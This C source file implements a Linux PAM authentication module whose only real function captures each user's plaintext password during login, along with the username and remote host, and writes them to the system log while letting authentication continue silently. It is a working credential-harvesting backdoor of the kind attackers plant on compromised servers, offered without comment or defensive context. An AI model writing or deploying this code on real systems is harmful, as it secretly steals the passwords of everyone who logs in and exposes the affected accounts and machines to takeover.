#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
#define PAM_SM_PASSWORD
#define PAM_SM_SESSION

#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/_pam_macros.h>

#include <syslog.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int printable( char c )
{
    return ( ( c >= ' ' ) && ( c <= '~') );
}

int
do_authenticate
    (
    pam_handle_t *pamh,
    const char *name,
    int argc,
    const char *argv[]
    )
{
    char  buffer[512];
    int   state = PAM_IGNORE;
    int   ret0  =          0;
    int   ret1  =          0;
    int   ret2  =          0;
    char *user  =       NULL;
    char *host  =       NULL;
    char *pass  =       NULL;

    if( NULL != pamh )
    {
        ret0 = pam_get_item( pamh, PAM_USER,    ( void * )&user );
        ret1 = pam_get_item( pamh, PAM_RHOST,   ( void * )&host );
        ret2 = pam_get_item( pamh, PAM_AUTHTOK, ( void * )&pass );

        if( ( PAM_SUCCESS == ret0 ) && ( NULL != user ) &&
            ( PAM_SUCCESS == ret1 ) && ( NULL != host ) &&
            ( PAM_SUCCESS == ret2 ) && ( NULL != pass )  )
        {
            int b = 0;
            for( int i = 0; i < strlen( pass ); ++i )
            {
                if( ( b + 4 ) >= sizeof( buffer ) )
                {
                    break;
                }
                if( printable( pass[ i ] ) )
                {
                    buffer[ b++ ] = pass[ i ];
                }
                else
                {
                    sprintf( buffer + b, "[%02X]", pass[ i ] );
                    b += 4;
                }
                buffer[ b ] = 0;
            }
            pam_syslog( pamh, LOG_DEBUG, "%s:%s@%s", user, buffer, host );
        }
    }

    return( state );
}

int
pam_sm_open_session
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( PAM_IGNORE );
}

int
pam_sm_close_session
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( PAM_IGNORE );
}

int
pam_sm_acct_mgmt
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( PAM_IGNORE );
}

int
pam_sm_authenticate
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( do_authenticate( pamh, "pam_sm_authenticate", argc, argv ) );
}

int
pam_sm_setcred
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( PAM_IGNORE );
}

int
pam_sm_chauthtok
    (
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char *argv[]
    )
{
    return( PAM_IGNORE );
}

